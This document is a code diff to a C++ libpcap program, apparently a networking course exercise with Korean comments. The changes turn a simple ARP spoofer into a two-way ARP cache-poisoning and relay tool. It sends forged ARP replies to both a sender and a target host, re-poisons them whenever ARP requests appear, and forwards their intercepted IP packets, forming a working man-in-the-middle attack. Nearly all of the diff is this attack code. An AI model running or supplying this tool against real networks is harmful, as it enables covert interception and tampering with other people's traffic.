@@ -11,8 +11,8 @@
 #include <netinet/in.h> 
 #include <vector>
 
-#include "ethhdr.h"
-#include "arphdr.h"
+#include "./include/ethhdr.h"
+#include "./include/arphdr.h"
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -82,8 +82,8 @@ EthArpPacket construct_arp_req(Mac smac, Ip sip, Ip tip) {
 	return packet;
 }	
 
-EthArpPacket* arp_reply(pcap_t* pcap, Ip sip, Ip tip, uint16_t op) {
-	while (true) {
+EthArpPacket* recieve_arp_reply(pcap_t* pcap, Ip sip, Ip tip, uint16_t op) {
+	for(int i = 0; i < 10; i++) {
 		struct pcap_pkthdr* header;
 		const u_char* packet;
 		int res = pcap_next_ex(pcap, &header, &packet);
@@ -99,12 +99,13 @@ EthArpPacket* arp_reply(pcap_t* pcap, Ip sip, Ip tip, uint16_t op) {
 		if (eth_arp_packet->arp_.tip_ != ntohl(tip)) continue; // tip check
 		return eth_arp_packet;
 	}
+	return nullptr;
 }
 
-EthArpPacket construct_arp_reply(pcap_t* pcap, Mac my_mac, Mac victim_mac, Ip target_ip, Ip victim_ip) {
+EthArpPacket construct_arp_reply(pcap_t* pcap, Mac my_mac, Mac sender_mac, Ip target_ip, Ip sender_ip) {
 	EthArpPacket packet;
 
-	packet.eth_.dmac_ = victim_mac;
+	packet.eth_.dmac_ = sender_mac;
 	packet.eth_.smac_ = my_mac;
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
@@ -115,21 +116,70 @@ EthArpPacket construct_arp_reply(pcap_t* pcap, Mac my_mac, Mac victim_mac, Ip ta
 	packet.arp_.op_ = htons(ArpHdr::Reply);
 	packet.arp_.smac_ = my_mac;
 	packet.arp_.sip_ = htonl(target_ip);
-	packet.arp_.tmac_ = victim_mac;
-	packet.arp_.tip_ = htonl(victim_ip);
+	packet.arp_.tmac_ = sender_mac;
+	packet.arp_.tip_ = htonl(sender_ip);
 
 	return packet;
 }
 
 struct ArpPair {
-    Ip victim_ip;
+    Ip sender_ip;
     Ip target_ip;
-    Mac victim_mac;
+    Mac sender_mac;
     Mac target_mac;
-    EthArpPacket spoof_packet;
+    EthArpPacket sender_spoof_pkt; // sender에게 보내는 ARP reply 패킷
+	EthArpPacket target_spoof_pkt; // Target에게 보내는 ARP reply 패킷
 };
+std::vector<ArpPair> arp_pairs;
 
-std::vector<ArpPair> arp_pairs; 
+typedef struct {
+    uint8_t version_ihl;
+    uint8_t type_of_service;
+    uint16_t total_length;
+    uint16_t id;
+    uint16_t flags_offset;
+    uint8_t ttl;
+    uint8_t protocol;
+    uint16_t checksum;
+    uint32_t src_ip;
+    uint32_t dst_ip;
+} IpHdr;
+
+EthHdr*	construct_ethernet_header(uint16_t type, Mac smac, Mac dmac) {
+	EthHdr* eth_hdr = new EthHdr();
+	eth_hdr->smac_ = smac;
+	eth_hdr->dmac_ = dmac;
+	eth_hdr->type_ = htons(type);
+	return eth_hdr;
+}
+
+bool send_arp_reply(pcap_t* pcap, const EthArpPacket* packet) {
+	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(packet), sizeof(EthArpPacket));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+		return false;
+	}
+	return true;
+}
+
+bool packet_forwarding(pcap_t* pcap, Mac src_mac, Mac my_mac, int caplen, const u_char* packet) {
+	EthHdr eth_hdr;
+	eth_hdr.dmac_ = src_mac;
+	eth_hdr.smac_ = my_mac;
+	eth_hdr.type_ = ((EthHdr*)packet)->type_;
+
+	uint8_t forward_packet[BUFSIZ];
+	memcpy(forward_packet, &eth_hdr, sizeof(EthHdr));
+	memcpy(forward_packet + sizeof(EthHdr), packet + sizeof(EthHdr), caplen - sizeof(EthHdr));	
+
+	int res = pcap_sendpacket(pcap, forward_packet, caplen);
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+		return false;
+	}
+	return true;
+}
+
 int main(int argc, char* argv[]) {
 	if ((argc - 2) % 2 != 0 || argc < 4) {
 		usage();
@@ -144,7 +194,7 @@ int main(int argc, char* argv[]) {
 		return EXIT_FAILURE;
 	}
 
-	//1. MyIP, MyMac, victim_ip, target_ip 설정
+	//1. MyIP, MyMac, sender_ip, target_ip 설정
     std::string ip_str = get_ip(dev);
     std::string mac_str = get_mac(dev);
 	Ip my_ip(ip_str);
@@ -153,18 +203,18 @@ int main(int argc, char* argv[]) {
 	printf("My Mac: %s\n", std::string(my_mac).c_str());
 
 	for (int i = 2; i < argc; i += 2) {
-		Ip victim_ip(argv[i]);
+		Ip sender_ip(argv[i]);
 		Ip target_ip(argv[i + 1]);
 		
 		//2. ARP request
-		//2-1. VictimIP에 ARP request
-		EthArpPacket packet1 = construct_arp_req(my_mac, my_ip, victim_ip);
+		//2-1. senderIP에 ARP request
+		EthArpPacket packet1 = construct_arp_req(my_mac, my_ip, sender_ip);
 		int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet1), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 		}
-		Mac victim_mac = arp_reply(pcap, victim_ip, my_ip, ArpHdr::Reply)->arp_.smac_;
-		printf("%s\n", std::string(victim_mac).c_str());
+		Mac sender_mac = recieve_arp_reply(pcap, sender_ip, my_ip, ArpHdr::Reply)->arp_.smac_;
+		printf("%s\n", std::string(sender_mac).c_str());
 		
 		//2-2. TargetIP에 ARP request
 		EthArpPacket packet2 = construct_arp_req(my_mac, my_ip, target_ip);
@@ -172,26 +222,66 @@ int main(int argc, char* argv[]) {
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
 		}
-		Mac target_mac = arp_reply(pcap, target_ip, my_ip, ArpHdr::Reply)->arp_.smac_;
+		Mac target_mac = recieve_arp_reply(pcap, target_ip, my_ip, ArpHdr::Reply)->arp_.smac_;
 		printf("%s\n", std::string(target_mac).c_str());
 		
-		EthArpPacket spoof_pkt = construct_arp_reply(pcap, my_mac, victim_mac, target_ip, victim_ip);
-		
-		//3. ARP reply 패킷 구성
-    	arp_pairs.push_back({victim_ip, target_ip, victim_mac, target_mac, spoof_pkt});
+		EthArpPacket sender_spoof_pkt = construct_arp_reply(pcap, my_mac, sender_mac, target_ip, sender_ip);
+		EthArpPacket target_spoof_pkt = construct_arp_reply(pcap, my_mac, target_mac, sender_ip, target_ip);
+
+		//3. pair 생성
+    	arp_pairs.push_back({sender_ip, target_ip, sender_mac, target_mac, sender_spoof_pkt, target_spoof_pkt});
 	}
 
-	//4. 패킷 전송 -> arp는 신뢰기반이라서 그냥 전송해도 된다고 함..
-	while(true) {
-		for (const auto& arp_pair : arp_pairs) {
-			// 5. ARP reply 패킷 전송
-			int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&arp_pair.spoof_packet), sizeof(EthArpPacket));
-			if (res != 0) {
-				fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(pcap));
-			}
-			printf("Sent Arp reply, %s -> %s\n", std::string(arp_pair.victim_ip).c_str(), std::string(arp_pair.target_ip).c_str());
-		}
-		sleep(3);
+	// 4. ARP reply 패킷 일단 전송 -> 초기 설정 => 양쪽에 보내도록해야 함
+	for(const auto& arp_pair: arp_pairs) {
+		bool send_res = send_arp_reply(pcap, &arp_pair.sender_spoof_pkt);
+		printf("Sent ARP reply to sender: %s -> %s\n", std::string(arp_pair.sender_ip).c_str(), std::string(arp_pair.target_ip).c_str());
+		send_res = send_arp_reply(pcap, &arp_pair.target_spoof_pkt);
+		printf("Sent ARP reply to target: %s -> %s\n", std::string(arp_pair.target_ip).c_str(), std::string(arp_pair.sender_ip).c_str());
 	}
+
+	// 5. 패킷 잡아서 조건 만족하면 해당 작업 수행 -> 반복문
+	while(true){
+		struct pcap_pkthdr* header;
+		const u_char* packet;
+		int res = pcap_next_ex(pcap, &header, &packet);
+		if (res == 0) continue;
+		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+			break;
+		}
+		EthHdr* eth_hdr = (EthHdr*)packet;
+		IpHdr* ip_hdr = (IpHdr*)(packet + sizeof(EthHdr));
+		Ip src_ip = Ip(ntohl(ip_hdr->src_ip));
+		Ip dst_ip = Ip(ntohl(ip_hdr->dst_ip));
+
+		for(const auto& arp_pair: arp_pairs){
+			if(eth_hdr->type() == 0x0806) {
+				EthArpPacket* eth_arp_packet = (EthArpPacket*)packet;
+				if (eth_arp_packet->arp_.op_ == htons(ArpHdr::Request)) {
+					if (eth_arp_packet->arp_.sip() == arp_pair.target_ip && eth_arp_packet->arp_.tip() == arp_pair.sender_ip) {
+						bool res = send_arp_reply(pcap, &arp_pair.target_spoof_pkt);
+						printf("Sent ARP reply to sender: %s -> %s\n", std::string(arp_pair.sender_ip).c_str(), std::string(arp_pair.target_ip).c_str());
+					}
+					if (eth_arp_packet->arp_.sip_ == arp_pair.sender_ip && eth_arp_packet->arp_.tip_ == arp_pair.target_ip) {
+						bool res = send_arp_reply(pcap, &arp_pair.sender_spoof_pkt);
+						printf("Sent ARP reply to sender: %s -> %s\n", std::string(arp_pair.sender_ip).c_str(), std::string(arp_pair.target_ip).c_str());
+					}
+				}			
+			}
+
+			//5-1. packet forwarding
+			if(dst_ip == arp_pair.sender_ip){
+				bool res = packet_forwarding(pcap, arp_pair.sender_mac, my_mac, header->caplen, packet);
+				// TODO: false 처리
+				printf("%s -> %s\n", std::string(src_ip).c_str(), std::string(dst_ip).c_str());
+			}
+			if(src_ip == arp_pair.sender_ip){
+				bool res = packet_forwarding(pcap, arp_pair.target_mac, my_mac, header->caplen, packet);
+				printf("%s -> %s\n", std::string(src_ip).c_str(), std::string(dst_ip).c_str());
+			}
+		}
+	}
+
 	pcap_close(pcap);
 }
